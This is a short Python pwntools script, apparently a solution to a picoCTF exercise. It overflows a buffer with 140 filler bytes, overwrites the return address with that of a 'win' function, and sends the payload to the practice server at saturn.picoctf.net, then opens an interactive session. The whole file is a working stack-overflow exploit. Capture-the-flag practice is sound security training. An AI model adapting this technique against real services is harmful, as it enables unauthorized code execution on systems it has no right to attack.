#!/usr/bin/env python3
from pwn import *

win_func = p32(0x00401530)
jnk = b'\x41' * 140

payload = jnk + win_func

p = remote('saturn.picoctf.net', 64936)
print(p.recvuntil('ng!\r\n'))
p.sendline(payload)
print(p.recv())
p.interactive()
